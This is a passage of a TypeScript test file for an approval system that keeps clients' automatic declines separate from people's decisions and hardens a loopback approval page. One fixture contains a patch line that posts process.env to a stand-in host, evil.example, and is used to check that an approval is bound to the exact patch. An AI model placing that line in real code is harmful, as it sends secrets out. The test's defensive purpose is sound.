/**
 * Claude Desktop approvals, as the clients really behave (measured 2026-11-10, Claude Desktop 4.4212.0):
 *  - Code tab: embedded Claude Code 2.1.309 declares elicitation (form, url), protocol 2026-07-28, and answers the dialog
 *    `decline` 9-34 ms after it is asked, with nothing on screen (anthropics/claude-code#89858).
 *  - Chat: client `claude-ai`, no elicitation declared.
 * Before this change Praxis recorded the Code tab's own decline as "rejected by the user". These tests hold the fix: an
 * instant answer is the client's and nothing is attributed to the user without evidence. The approval page they drive is
 * the test source's mechanism (PRAXIS_APPROVAL_PAGE under PRAXIS_TEST_APPROVALS); a shipped Runtime never uses it for a
 * protected action, because anything running as the user can operate a page on loopback (docs/approval-threat-model.md).
 */
import { request as httpRequest } from "node:http";
import { existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import { ApprovalNeedsInput, decisionLogPath, obtainUserApproval, withApprovalChannel, type ApprovalRequest, type UserApprovalChannel } from "@praxis/contracts";
import { approvalKey, noteDialogAsked, roundTripChannel } from "./approval-channel.js";
import { approvalPageChannel, setApprovalPageOpenerForTest, stopApprovalPages } from "./approval-page.js";
import { serviceFixCommitRequest } from "./story-engine.js";
import { diagnosticsPath } from "./diagnostics-log.js";
import { knownAutoAnswer, clientKey, resetDialogObservations } from "./dialog-observations.js";
import { callTool, type ClientReport } from "./tools.js";
import type { McpEnvelope } from "./workflow-test-helpers.js";

const CODE_TAB: ClientReport = {
  name: "claude-code",
  version: "2.1.309",
  protocolVersion: "2026-07-28",
  capabilities: ["elicitation", "extensions", "roots"],
  elicitation: { declared: { form: {}, url: {} }, form: true, url: true },
  dialog: true,
  flow: "input-required-round-trip",
};
const CHAT: ClientReport = { name: "claude-ai", version: "0.1.0", protocolVersion: "2026-07-28", capabilities: ["extensions"], elicitation: { declared: null, form: false, url: false }, dialog: false, flow: "input-required-round-trip", reason: "the client did not declare the elicitation capability (in the request envelope)" };

const ENV = ["PRAXIS_STATE_HOME", "PRAXIS_APPROVAL_PAGE", "PRAXIS_APPROVAL_MIN_ANSWER_MS", "PRAXIS_APPROVAL_PAGE_WAIT_MS", "PRAXIS_APPROVAL_MODE", "PRAXIS_APPROVAL_PAGE_MIN_MS"] as const;
let saved: Record<string, string | undefined>;
let repo: string;
let opened: string[];

beforeEach(() => {
  saved = Object.fromEntries(ENV.map((k) => [k, process.env[k]]));
  process.env.PRAXIS_STATE_HOME = mkdtempSync(join(tmpdir(), "praxis-desktop-home-"));
  process.env.PRAXIS_APPROVAL_MIN_ANSWER_MS = "1000"; // the production default: these tests are about it
  process.env.PRAXIS_APPROVAL_PAGE = "on";
  process.env.PRAXIS_APPROVAL_PAGE_WAIT_MS = "4000";
  // the page's earliest-decision rule has its own test; elsewhere the scripted browser decides at once
  process.env.PRAXIS_APPROVAL_PAGE_MIN_MS = "0";
  delete process.env.PRAXIS_APPROVAL_MODE;
  resetDialogObservations();
  opened = [];
  setApprovalPageOpenerForTest(async (url) => {
    opened.push(url);
    return true;
  });
  repo = mkdtempSync(join(tmpdir(), "praxis-desktop-repo-"));
  writeFileSync(join(repo, "package.json"), `${JSON.stringify({ name: "x", scripts: { test: "node --test" } })}\n`);
});
afterEach(() => {
  setApprovalPageOpenerForTest(undefined);
  stopApprovalPages();
  rmSync(repo, { recursive: true, force: true });
  rmSync(process.env.PRAXIS_STATE_HOME!, { recursive: true, force: true });
  for (const k of ENV) {
    if (saved[k] === undefined) delete process.env[k];
    else process.env[k] = saved[k];
  }
  resetDialogObservations();
  vi.useRealTimers();
});

const journal = () => (existsSync(decisionLogPath(repo)) ? readFileSync(decisionLogPath(repo), "utf8").trim().split("\n").map((l) => JSON.parse(l) as Record<string, unknown>) : []);
const sleep = (ms: number) => new Promise((r) => setTimeout(r, ms));

function http(url: string, init: { method?: string; headers?: Record<string, string>; body?: string } = {}): Promise<{ status: number; body: string; headers: Record<string, string | string[] | undefined> }> {
  return new Promise((resolveHttp, reject) => {
    const req = httpRequest(url, { method: init.method ?? "GET", headers: init.headers ?? {} }, (res) => {
      let body = "";
      res.on("data", (c) => (body += c));
      res.on("end", () => resolveHttp({ status: res.statusCode ?? 0, body, headers: res.headers }));
    });
    req.on("error", reject);
    if (init.body) req.write(init.body);
    req.end();
  });
}

/** The cookie the page's first load set, as the browser sends it back. */
const cookieFrom = (res: { headers: Record<string, string | string[] | undefined> }): string => String(res.headers["set-cookie"]).split(";")[0]!;

/** What a browser does: load the page Praxis opened, then press a button (a scripted test action, not a person). */
async function decideInPage(secretUrl: string, decision: "approve" | "reject", reason?: string) {
  const page = await http(secretUrl);
  expect(page.status).toBe(200);
  const token = /token=("[0-9a-f]+")/.exec(page.body)![1]!;
  const { origin, pathname } = new URL(secretUrl);
  return http(`${origin}${pathname}/decision`, {
    method: "POST",
    headers: { "content-type": "application/json", origin, cookie: cookieFrom(page), "x-praxis-approval-token": JSON.parse(token) as string },
    body: JSON.stringify({ decision, ...(reason ? { reason } : {}) }),
  });
}

async function waitForPage(count = 1): Promise<string> {
  for (let i = 0; i < 200 && opened.length < count; i += 1) await sleep(10);
  expect(opened.length).toBeGreaterThanOrEqual(count);
  return opened[count - 1]!;
}

const init = (client: ClientReport | undefined, approvalChannel?: UserApprovalChannel) =>
  callTool("praxis_project_init_apply", { repo, confirmation: "YES" }, { role: "developer", version: "t", ...(client ? { client } : {}), ...(approvalChannel ? { approvalChannel } : {}) }) as Promise<McpEnvelope>;

/**
 * The Code tab's exchange: input_required, then the retry carrying the client's own `decline` exactly `after` ms later.
 * The clock is fixed for the retry, so the measured time is `after` on any machine (a slow CI runner included).
 */
async function codeTabDecline(after = 30) {
  const needs = await init(CODE_TAB, roundTripChannel(undefined, "claude-code 2.1.309")).catch((e: unknown) => e);
  expect(needs).toBeInstanceOf(ApprovalNeedsInput);
  const key = approvalKey((needs as ApprovalNeedsInput).request);
  return answeredAfter(key, after, () => init(CODE_TAB, roundTripChannel({ [key]: { action: "decline" } }, "claude-code 2.1.309")));
}

/** Runs the retry that carries the client's answer with the clock fixed `after` ms past the question. */
async function answeredAfter<T>(key: string, after: number, retry: () => Promise<T>): Promise<T> {
  const asked = Date.now();
  vi.useFakeTimers({ toFake: ["Date"] });
  vi.setSystemTime(asked);
  noteDialogAsked(key);
  vi.setSystemTime(asked + after);
  try {
    return await retry();
  } finally {
    vi.useRealTimers();
  }
}

describe("the Code tab's instant decline is the client's answer, never the user's", () => {
  it("without the page: nothing runs, nobody rejected, the journal says the client answered", async () => {
    process.env.PRAXIS_APPROVAL_PAGE = "off";
    const result = await codeTabDecline();
    expect(result.ok).toBe(false);
    expect(result.code).toBe("APPROVAL_CLIENT_UI_REQUIRED");
    expect(result.errors.join(" ")).toMatch(/nobody rejected it/);
    expect(result.errors.join(" ")).not.toMatch(/rejected by the user/);
    expect(result.data).toMatchObject({ executed: false, outcome: "auto-answered", decidedBy: "client", automatic: "decline" });
    expect(existsSync(join(repo, ".project"))).toBe(false);
    const rows = journal();
    expect(rows.map((r) => [r.decision, r.decidedBy])).toEqual([["auto-answered", "client"]]);
    expect(rows.some((r) => r.decision === "rejected")).toBe(false);
    // one fast answer never changes how this client is asked later; a second clearly automatic one does
    expect(knownAutoAnswer(clientKey(CODE_TAB))).toBeUndefined();
    writeFileSync(join(repo, "package.json"), `${JSON.stringify({ name: "x", scripts: { test: "node --test", build: "tsc" } })}\n`);
    await codeTabDecline();
    expect(knownAutoAnswer(clientKey(CODE_TAB))).toMatchObject({ automatic: "decline", count: 2 });
  });

  it("a decline that took longer than a reflex but less than a person needs to read is asked again in the page, and does not mark the client", async () => {
    const pending = codeTabDecline(400);
    const secret = await waitForPage();
    await decideInPage(secret, "reject", "really no");
    const result = await pending;
    // the person's rejection is recorded from the page, with the page as evidence; the 400 ms decline is the client's
    expect(result.code).toBe("APPROVAL_REJECTED");
    expect(result.data).toMatchObject({ decidedBy: "approval-page", personVerified: false, channel: "approval-page" });
    expect(journal().map((r) => [r.decision, r.decidedBy])).toEqual([["auto-answered", "client"], ["pending", "nobody"], ["rejected", "approval-page"]]);
    expect(knownAutoAnswer(clientKey(CODE_TAB))).toBeUndefined();
  });

  it("with the page: the same call asks the person in the page, and their Approve runs exactly that", async () => {
    const pending = codeTabDecline();
    const secret = await waitForPage();
    expect((await decideInPage(secret, "approve")).status).toBe(200);
    const result = await pending;
    expect(result.ok, JSON.stringify(result.errors)).toBe(true);
    expect(existsSync(join(repo, ".project"))).toBe(true);
    expect((result.data as { approval: unknown[] }).approval).toEqual([expect.objectContaining({ channel: "approval-page", assurance: "approval-page", decidedBy: "approval-page", personVerified: false })]);
    expect(journal().map((r) => [r.decision, r.decidedBy, r.channel])).toEqual([
      ["auto-answered", "client", "client-elicitation"],
      ["pending", "nobody", "approval-page"],
      ["approved", "approval-page", "approval-page"],
    ]);
  });

  it("is not asked through its dialog again: the next protected call goes to the page directly", async () => {
    const first = codeTabDecline();
    await decideInPage(await waitForPage(), "reject");
    expect((await first).code).toBe("APPROVAL_REJECTED");
    // seen twice: from now on this client version goes straight to the page
    const other = mkdtempSync(join(tmpdir(), "praxis-desktop-repo-"));
    try {
      const needs = (await callTool("praxis_project_init_apply", { repo: other, confirmation: "YES" }, { role: "developer", version: "t", client: CODE_TAB, approvalChannel: roundTripChannel(undefined) }).catch((e: unknown) => e)) as ApprovalNeedsInput;
      const again = answeredAfter(approvalKey(needs.request), 30, () => callTool("praxis_project_init_apply", { repo: other, confirmation: "YES" }, { role: "developer", version: "t", client: CODE_TAB, approvalChannel: roundTripChannel({ [approvalKey(needs.request)]: { action: "decline" } }) }));
      await decideInPage(await waitForPage(2), "reject");
      await again;
    } finally {
      rmSync(other, { recursive: true, force: true });
    }
    // a second action: no input_required round trip any more
    writeFileSync(join(repo, "package.json"), `${JSON.stringify({ name: "y", scripts: { test: "node --test", build: "tsc" } })}\n`);
    const second = init(CODE_TAB, roundTripChannel(undefined, "claude-code 2.1.309"));
    const secret = await waitForPage(3);
    await decideInPage(secret, "approve");
    const result = await second;
    expect(result.ok, JSON.stringify(result.errors)).toBe(true);
  });

  it("an answer that took a person's time is still the person's: a real Reject in the dialog is a rejection", async () => {
    process.env.PRAXIS_APPROVAL_MIN_ANSWER_MS = "100";
    const result = await codeTabDecline(150);
    expect(result.code).toBe("APPROVAL_REJECTED");
    expect(result.data).toMatchObject({ decidedBy: "client-dialog", personVerified: false, outcome: "rejected", evidence: { via: "client-elicitation" } });
    expect(opened).toHaveLength(0);
  });

  it("an instant Accept is not an approval either", async () => {
    process.env.PRAXIS_APPROVAL_PAGE = "off";
    const needs = (await init(CODE_TAB, roundTripChannel(undefined)).catch((e: unknown) => e)) as ApprovalNeedsInput;
    const result = (await answeredAfter(approvalKey(needs.request), 30, () => init(CODE_TAB, roundTripChannel({ [approvalKey(needs.request)]: { action: "accept", content: { decision: "approve" } } })))) as McpEnvelope;
    expect(result.ok).toBe(false);
    expect(result.data).toMatchObject({ outcome: "auto-answered", automatic: "accept" });
    expect(existsSync(join(repo, ".project"))).toBe(false);
  });

  it("an answer for a dialog this process never asked for is not used: the user is asked properly", async () => {
    const needs = (await init(CODE_TAB, roundTripChannel(undefined)).catch((e: unknown) => e)) as ApprovalNeedsInput;
    // no noteDialogAsked: an answer arriving without a question
    const again = await init(CODE_TAB, roundTripChannel({ [approvalKey(needs.request)]: { action: "accept", content: { decision: "approve" } } })).catch((e: unknown) => e);
    expect(again).toBeInstanceOf(ApprovalNeedsInput);
    expect(existsSync(join(repo, ".project"))).toBe(false);
  });
});

describe("Desktop Chat (no dialog): the approval page", () => {
  it("answers APPROVAL_PENDING while nobody decided, never gives the agent the link, and runs after the person approves", async () => {
    process.env.PRAXIS_APPROVAL_PAGE_WAIT_MS = "50";
    const first = await init(CHAT);
    expect(first.ok).toBe(false);
    expect(first.code).toBe("APPROVAL_PENDING");
    const secret = opened[0]!;
    const token = new URL(secret).searchParams.get("t")!;
    const requestId = new URL(secret).pathname.split("/")[2]!;
    expect(JSON.stringify(first)).not.toContain(token);
    expect(first.data).toMatchObject({ executed: false, outcome: "pending", decidedBy: "nobody", approvalPage: { requestId, status: "pending", openedInBrowser: true } });
    expect(first.errors.join(" ")).toMatch(/Do not open, search for or click that page yourself/);
    expect(existsSync(join(repo, ".project"))).toBe(false);

    // calling again while the page is open opens no second page
    expect((await init(CHAT)).code).toBe("APPROVAL_PENDING");
    expect(opened).toHaveLength(1);

    await decideInPage(secret, "approve");
    const applied = await init(CHAT);
    expect(applied.ok, JSON.stringify(applied.errors)).toBe(true);
    expect(existsSync(join(repo, ".project"))).toBe(true);
    // the approval was used once
    expect(journal().filter((r) => r.decision === "approved")).toHaveLength(1);
  });

  it("a Reject in the page runs nothing and is the user's rejection, with the page as evidence", async () => {
    const pending = init(CHAT);
    await decideInPage(await waitForPage(), "reject", "not this one");
    const result = await pending;
    expect(result.code).toBe("APPROVAL_REJECTED");
    expect(result.data).toMatchObject({ decidedBy: "approval-page", personVerified: false, channel: "approval-page", reason: "not this one", evidence: { via: "approval-page click" } });
    expect(existsSync(join(repo, ".project"))).toBe(false);
    expect(journal().at(-1)).toMatchObject({ decision: "rejected", decidedBy: "approval-page", personVerified: false, channel: "approval-page", reason: "not this one" });
  });

  it("an approval binds the exact content: a changed plan is asked again and the old Approve runs nothing", async () => {
    process.env.PRAXIS_APPROVAL_PAGE_WAIT_MS = "50";
    expect((await init(CHAT)).code).toBe("APPROVAL_PENDING");
    await decideInPage(opened[0]!, "approve");
    // the project changes before the agent applies: the plan (the .project content) is different now
    writeFileSync(join(repo, "package.json"), `${JSON.stringify({ name: "x", scripts: { test: "node --test", build: "tsc" } })}\n`);
    const result = await init(CHAT);
    expect(result.code).toBe("APPROVAL_PENDING");
    expect(opened).toHaveLength(2);
    expect(existsSync(join(repo, ".project"))).toBe(false);
  });

  it("a request nobody decides expires, and is journaled as expired, not as a no", async () => {
    vi.useFakeTimers({ toFake: ["Date"] });
    process.env.PRAXIS_APPROVAL_PAGE_WAIT_MS = "0";
    expect((await init(CHAT)).code).toBe("APPROVAL_PENDING");
    vi.setSystemTime(Date.now() + 11 * 60_000);
    expect((await init(CHAT)).code).toBe("APPROVAL_PENDING");
    expect(opened).toHaveLength(2);
    expect(journal().map((r) => r.decision)).toEqual(["pending", "expired", "pending"]);
    // the first page cannot be decided any more
    expect((await http(opened[0]!)).status).toBe(404);
  });

  it("acts only the person may perform go to the (test) page, whatever a retired mode variable says", async () => {
    for (const mode of ["trusted-client", "host-permission"]) {
      process.env.PRAXIS_APPROVAL_MODE = mode;
      process.env.PRAXIS_APPROVAL_PAGE_WAIT_MS = "4000";
      opened = [];
      const before = opened.length;
      const workItem = mkdtempSync(join(tmpdir(), "praxis-desktop-wi-"));
      try {
        const command = JSON.stringify({ action: "open", mode: "classic", projectId: "p", title: "t", request: "r" });
        const previewed = (await callTool("praxis_workflow_preview", { repo: workItem, command }, { role: "ba", version: "t", client: CHAT })) as McpEnvelope;
        const pending = callTool("praxis_workflow_apply", { repo: workItem, command, confirmation: "YES", previewFingerprint: previewed.data.fingerprint }, { role: "ba", version: "t", client: CHAT }) as Promise<McpEnvelope>;
        await decideInPage(await waitForPage(before + 1), "approve");
        const result = await pending;
        expect(result.ok, `${mode}: ${JSON.stringify(result.errors)}`).toBe(true);
        expect((result.data as { approval: Array<{ channel: string }> }).approval.map((a) => a.channel)).toEqual(["approval-page"]);
      } finally {
        rmSync(workItem, { recursive: true, force: true });
      }
    }
  });

  it("opens at most a handful of pages a minute: an agent retrying in a loop cannot flood the browser", async () => {
    process.env.PRAXIS_APPROVAL_PAGE_WAIT_MS = "0";
    const codes: string[] = [];
    const repos = Array.from({ length: 8 }, () => mkdtempSync(join(tmpdir(), "praxis-desktop-flood-")));
    try {
      for (const other of repos) {
        const result = (await callTool("praxis_project_init_apply", { repo: other, confirmation: "YES" }, { role: "developer", version: "t", client: CHAT })) as McpEnvelope;
        codes.push(String(result.code));
      }
    } finally {
      for (const other of repos) rmSync(other, { recursive: true, force: true });
    }
    expect(opened).toHaveLength(6);
    expect(codes.slice(0, 6).every((c) => c === "APPROVAL_PENDING")).toBe(true);
    expect(codes.slice(6)).toEqual(["APPROVAL_REQUIRED", "APPROVAL_REQUIRED"]);
  });

  it("a computer where no browser can be opened falls back to plain no-dialog behaviour", async () => {
    setApprovalPageOpenerForTest(async () => false);
    const result = await init(CHAT);
    expect(result.code).toBe("APPROVAL_CLIENT_UI_REQUIRED");
    expect(result.errors.join(" ")).toMatch(/could not open the approval page/);
    expect(result.data).toMatchObject({ outcome: "unavailable", decidedBy: "nobody" });
  });
});

describe("the doctor says how approvals will be asked, with the evidence", () => {
  it("Chat: no dialog, so protected actions are refused; independent human authorization is not available", async () => {
    const doctor = (await callTool("praxis_doctor", { repo }, { role: "developer", version: "t", client: CHAT })) as McpEnvelope;
    const approval = (doctor.data as { approval: Record<string, unknown> }).approval;
    expect(approval.mode).toBe("no-dialog");
    expect(approval.page).toBeUndefined();
    expect(approval.trust).toMatchObject({ protectedActions: expect.stringMatching(/refused/), independentHumanApproval: expect.stringMatching(/not available/) });
    expect(approval.minAnswerMs).toBe(1000);
  });

  it("Code tab: once seen answering by itself, the doctor shows it and protected actions are refused there", async () => {
    process.env.PRAXIS_APPROVAL_PAGE = "off";
    await codeTabDecline();
    writeFileSync(join(repo, "package.json"), `${JSON.stringify({ name: "x", scripts: { test: "node --test", build: "tsc" } })}\n`);
    await codeTabDecline();
    process.env.PRAXIS_APPROVAL_PAGE = "on";
    const doctor = (await callTool("praxis_doctor", { repo }, { role: "developer", version: "t", client: CODE_TAB, approvalChannel: roundTripChannel(undefined) })) as McpEnvelope;
    const approval = (doctor.data as { approval: Record<string, unknown> }).approval;
    expect(approval.observedDialog).toMatchObject({ automatic: "decline" });
    expect(approval.mode).toBe("no-dialog");
  });
});

describe("the page itself", () => {
  async function openOne() {
    process.env.PRAXIS_APPROVAL_PAGE_WAIT_MS = "0";
    await init(CHAT);
    const secret = opened[0]!;
    const url = new URL(secret);
    return { secret, origin: url.origin, path: url.pathname };
  }

  it("shows the exact action and refuses framing, scripts from elsewhere and caching", async () => {
    const { secret } = await openOne();
    const page = await http(secret);
    expect(page.body).toContain(".project");
    expect(page.body).toContain("Approve and run exactly this");
    expect(String(page.headers["content-security-policy"])).toMatch(/frame-ancestors 'none'/);
    expect(String(page.headers["content-security-policy"])).toMatch(/script-src 'nonce-/);
    expect(page.headers["x-frame-options"]).toBe("DENY");
    expect(page.headers["cache-control"]).toBe("no-store");
    expect(page.headers["referrer-policy"]).toBe("no-referrer");
  });

  it("its link is single-use: a second use (a copy from history, a racing opener) opens nothing and is recorded; the first browser keeps working", async () => {
    process.env.PRAXIS_APPROVAL_PAGE_WAIT_MS = "0";
    await init(CHAT);
    const first = await http(opened[0]!);
    expect(first.status).toBe(200);
    expect(String(first.headers["set-cookie"])).toMatch(/HttpOnly; SameSite=Strict; Path=\/a\//);
    const copy = await http(opened[0]!);
    expect(copy.status).toBe(403);
    expect(copy.body).toMatch(/already opened somewhere else/);
    // the browser that opened it reloads with its cookie and no secret in the address
    const cookie = String(first.headers["set-cookie"]).split(";")[0]!;
    const reload = await http(opened[0]!.split("?")[0]!, { headers: { cookie } });
    expect(reload.status).toBe(200);
    // the pending result tells the agent the link was used again, and the decision's evidence says so
    expect((await init(CHAT)).data).toMatchObject({ approvalPage: { linkUsedAgain: true } });
    const token = JSON.parse(/token=("[0-9a-f]+")/.exec(reload.body)![1]!) as string;
    const { origin, pathname } = new URL(opened[0]!);
    const post = (decision: string) => http(`${origin}${pathname}/decision`, { method: "POST", headers: { "content-type": "application/json", origin, cookie, "x-praxis-approval-token": token }, body: JSON.stringify({ decision }) });
    // once the link was used twice, Praxis cannot tell which opener is the person: an Approve is refused, a Reject is taken
    expect((await post("approve")).status).toBe(409);
    expect(reload.body).toMatch(/used more than once/);
    expect((await post("reject")).status).toBe(200);
    expect(journal().some((r) => (r.evidence as { via?: string } | undefined)?.via === "the single-use page link was used again")).toBe(true);
    expect(journal().at(-1)).toMatchObject({ decision: "rejected", evidence: { via: expect.stringMatching(/used again elsewhere/) } });
    // a browser arriving after the decision sees what happened to the request
    const late = await http(opened[0]!);
    expect(late.body).toMatch(/already opened somewhere else/);
    expect(late.body).toMatch(/already been <strong>rejected<\/strong>/);
  });

  it("opens nothing without the secret, and records nothing without the page's token and origin", async () => {
    const { secret, origin, path } = await openOne();
    expect((await http(`${origin}${path}`)).status).toBe(403);
    expect((await http(`${origin}${path}?t=${"0".repeat(48)}`)).status).toBe(403);
    expect((await http(secret, { headers: { host: "evil.example" } })).status).toBe(403);
    const page = await http(secret);
    const token = JSON.parse(/token=("[0-9a-f]+")/.exec(page.body)![1]!) as string;
    const cookie = cookieFrom(page);
    const post = (headers: Record<string, string>, body = JSON.stringify({ decision: "approve" })) => http(`${origin}${path}/decision`, { method: "POST", headers: { cookie, ...headers }, body });
    expect((await post({ "content-type": "application/json", origin })).status).toBe(403); // no token
    expect((await post({ "content-type": "application/json", "x-praxis-approval-token": token })).status).toBe(403); // no origin
    expect((await post({ "content-type": "application/json", origin: "http://evil.example", "x-praxis-approval-token": token })).status).toBe(403);
    expect((await post({ "content-type": "text/plain", origin, "x-praxis-approval-token": token })).status).toBe(415);
    expect((await post({ "content-type": "application/json", origin, "x-praxis-approval-token": token }, JSON.stringify({ decision: "yes please" }))).status).toBe(400);
    expect(journal().filter((r) => r.decision === "approved")).toHaveLength(0);
    expect((await post({ "content-type": "application/json", origin, "x-praxis-approval-token": token })).status).toBe(200);
    // the token without the binding cookie (another program that only read the page) is refused
    expect((await http(`${origin}${path}/decision`, { method: "POST", headers: { "content-type": "application/json", origin, "x-praxis-approval-token": token }, body: JSON.stringify({ decision: "approve" }) })).status).toBe(403);
    // decided once: a replay changes nothing
    expect((await post({ "content-type": "application/json", origin, "x-praxis-approval-token": token }, JSON.stringify({ decision: "reject" }))).status).toBe(403);
    expect(journal().filter((r) => r.decidedBy === "approval-page").map((r) => r.decision)).toEqual(["approved"]);
  });
});

describe("one click, one execution, of exactly what was shown (independent review findings)", () => {
  it("two calls waiting on the same page: one click runs the action once; the other call asks anew", async () => {
    process.env.PRAXIS_APPROVAL_PAGE_WAIT_MS = "1500";
    const runs: string[] = [];
    const request: ApprovalRequest = { action: "praxis_developer_git_commit", kind: "git_operation", summary: "Commit x", description: "one file", subject: "s1" };
    const ask = () => withApprovalChannel(approvalPageChannel({ repo }), () => obtainUserApproval(request, { repo }).then(() => runs.push("ran"), (e: { code: string }) => runs.push(e.code)));
    const a = ask();
    const b = ask();
    // both started together: one page only
    await sleep(100);
    expect(opened).toHaveLength(1);
    await decideInPage(opened[0]!, "approve");
    await Promise.all([a, b]);
    expect(runs.filter((r) => r === "ran")).toHaveLength(1);
    expect(runs.filter((r) => r !== "ran")).toEqual(["APPROVAL_PENDING"]);
    expect(opened).toHaveLength(2);
  });

  it("two tabs posting at once record one decision", async () => {
    process.env.PRAXIS_APPROVAL_PAGE_WAIT_MS = "0";
    await init(CHAT);
    const page = await http(opened[0]!);
    const token = JSON.parse(/token=("[0-9a-f]+")/.exec(page.body)![1]!) as string;
    // a second tab of the same browser: it carries the cookie the first load set
    const cookie = String(page.headers["set-cookie"]).split(";")[0]!;
    const second = await http(opened[0]!.split("?")[0]!, { headers: { cookie } });
    const token2 = JSON.parse(/token=("[0-9a-f]+")/.exec(second.body)![1]!) as string;
    const { origin, pathname } = new URL(opened[0]!);
    const post = (t: string, decision: string) => http(`${origin}${pathname}/decision`, { method: "POST", headers: { "content-type": "application/json", origin, cookie, "x-praxis-approval-token": t }, body: JSON.stringify({ decision }) });
    const results = await Promise.all([post(token, "reject"), post(token2, "approve")]);
    // one is recorded; the other is refused (409 if it read its body before the first finished, 403 once the tokens are gone)
    expect(results.filter((r) => r.status === 200)).toHaveLength(1);
    expect(results.filter((r) => r.status === 403 || r.status === 409)).toHaveLength(1);
    expect(journal().filter((r) => r.decidedBy === "approval-page")).toHaveLength(1);
  });

  it("the same subject with different text shown is another request: an Approve for one text never runs another", async () => {
    process.env.PRAXIS_APPROVAL_PAGE_WAIT_MS = "0";
    const base: ApprovalRequest = { action: "praxis_quality_service_fix", kind: "git_operation", summary: "Commit a fix", description: "harmless patch", subject: "same" };
    const ask = (r: ApprovalRequest) => withApprovalChannel(approvalPageChannel({ repo }), () => obtainUserApproval(r, { repo })).catch((e: { code: string }) => e.code);
    expect(await ask(base)).toBe("APPROVAL_PENDING");
    await decideInPage(opened[0]!, "approve");
    expect(await ask({ ...base, description: "a different patch" })).toBe("APPROVAL_PENDING");
    expect(opened).toHaveLength(2);
  });

  it("a Quality fix approval binds the patch content: the same files with a different patch are a different subject, and the patch is shown", () => {
    const change = { serviceId: "web", findingId: "F-1", branch: "quality/web-fix", baseSha: "abc", files: ["src/a.js"] };
    const one = serviceFixCommitRequest({ change, proposal: { files: [{ path: "src/a.js", after: "export const ok = 1;\n" }] } }, "/r", "US-1");
    const two = serviceFixCommitRequest({ change, proposal: { files: [{ path: "src/a.js", after: "fetch('https://evil.example', { body: process.env })\n" }] } }, "/r", "US-1");
    expect(one.request.subject).not.toBe(two.request.subject);
    expect(one.request.description).toContain("export const ok = 1;");
    expect(two.request.description).toContain("evil.example");
  });

  it("answers no CORS preflight, accepts the localhost name, and never writes the secret to the diagnostics log", async () => {
    process.env.PRAXIS_APPROVAL_PAGE_WAIT_MS = "0";
    await init(CHAT);
    const url = new URL(opened[0]!);
    const preflight = await http(`${url.origin}${url.pathname}/decision`, { method: "OPTIONS", headers: { origin: "http://evil.example", "access-control-request-method": "POST" } });
    expect(preflight.status).toBe(405);
    expect(preflight.headers["access-control-allow-origin"]).toBeUndefined();
    const viaLocalhost = await http(opened[0]!.replace("127.0.0.1", "localhost"));
    expect(viaLocalhost.status).toBe(200);
    const token = url.searchParams.get("t")!;
    const diag = existsSync(diagnosticsPath()) ? readFileSync(diagnosticsPath(), "utf8") : "";
    expect(diag).not.toContain(token);
    expect(readFileSync(decisionLogPath(repo), "utf8")).not.toContain(token);
  });
});

describe("settings a repository could set are not taken from the environment (second review, verified with Claude Code)", () => {
  it("outside the test source a weakening setting in the environment is ignored and reported; a stricter one is kept", async () => {
    const { approvalSettings } = await import("./approval-settings.js");
    const saved = { ...process.env };
    try {
      // as a Runtime started by Claude Code whose repository's .claude/settings.json set these
      delete process.env.PRAXIS_TEST_APPROVALS;
      process.env.PRAXIS_APPROVAL_MODE = "trusted-client";
      process.env.PRAXIS_APPROVAL_BROWSER = "/usr/bin/true";
      process.env.PRAXIS_APPROVAL_MIN_ANSWER_MS = "0";
      process.env.PRAXIS_APPROVAL_PAGE_MIN_MS = "5000";
      process.env.PRAXIS_APPROVAL_PAGE = "on";
      const settings = approvalSettings();
      expect(settings).not.toHaveProperty("mode");
      expect(settings.browser).toBe("");
      expect(settings.page).toBe(false);
      expect(settings.minAnswerMs).toBe(1000);
      expect(settings.ignoredEnvironment.sort()).toEqual(["PRAXIS_APPROVAL_BROWSER", "PRAXIS_APPROVAL_MIN_ANSWER_MS", "PRAXIS_APPROVAL_MODE", "PRAXIS_APPROVAL_PAGE", "PRAXIS_APPROVAL_PAGE_MIN_MS", "PRAXIS_TEST_ANCESTRY"]);
      // a longer minimum answer time is stricter and is taken from anywhere
      process.env.PRAXIS_APPROVAL_MIN_ANSWER_MS = "5000";
      expect(approvalSettings().minAnswerMs).toBe(5000);
    } finally {
      for (const key of Object.keys(process.env)) if (!(key in saved)) delete process.env[key];
      Object.assign(process.env, saved);
    }
  });
});

describe("the page takes no decision before a person could have read it (second review, LOW 8)", () => {
  it("an Approve within the earliest-decision time after the first load is refused; after it, taken", async () => {
    process.env.PRAXIS_APPROVAL_PAGE_MIN_MS = "400";
    process.env.PRAXIS_APPROVAL_PAGE_WAIT_MS = "0";
    await init(CHAT);
    const page = await http(opened[0]!);
    const token = JSON.parse(/token=("[0-9a-f]+")/.exec(page.body)![1]!) as string;
    const { origin, pathname } = new URL(opened[0]!);
    const post = () => http(`${origin}${pathname}/decision`, { method: "POST", headers: { "content-type": "application/json", origin, cookie: cookieFrom(page), "x-praxis-approval-token": token }, body: JSON.stringify({ decision: "approve" }) });
    expect((await post()).status).toBe(425);
    await sleep(450);
    expect((await post()).status).toBe(200);
  });
});

describe("the journal of earlier misattributions", () => {
  function seed() {
    const path = decisionLogPath(repo);
    mkdirSync(join(path, ".."), { recursive: true });
    writeFileSync(
      path,
      [
        { at: "2026-10-22T18:32:06.525Z", action: "praxis_project_init_apply", summary: "Write .project", subjectDigest: "sha256:b", decision: "rejected", channel: "client-elicitation", repository: repo },
        { at: "2026-10-28T10:00:00.000Z", action: "praxis_developer_git_commit", summary: "declined", subjectDigest: "sha256:a", decision: "rejected", channel: "none", reason: "the user declined (reported by the agent)", repository: repo },
      ].map((e) => JSON.stringify(e)).join("\n") + "\n",
    );
    const diag = join(process.env.PRAXIS_STATE_HOME!, "diagnostics", "mcp.jsonl");
    mkdirSync(join(diag, ".."), { recursive: true });
    writeFileSync(
      diag,
      [
        { at: "2026-10-22T18:32:06.514Z", pid: 1, event: "tool_enter", callId: "a", tool: "praxis_project_init_apply", client: "claude-code" },
        { at: "2026-10-22T18:32:06.516Z", pid: 1, event: "input_required", callId: "a", tool: "praxis_project_init_apply" },
        { at: "2026-10-22T18:32:06.525Z", pid: 1, event: "tool_enter", callId: "b", tool: "praxis_project_init_apply", client: "claude-code" },
        { at: "2026-10-22T18:32:06.526Z", pid: 1, event: "tool_finished", callId: "b", tool: "praxis_project_init_apply", code: "APPROVAL_REJECTED" },
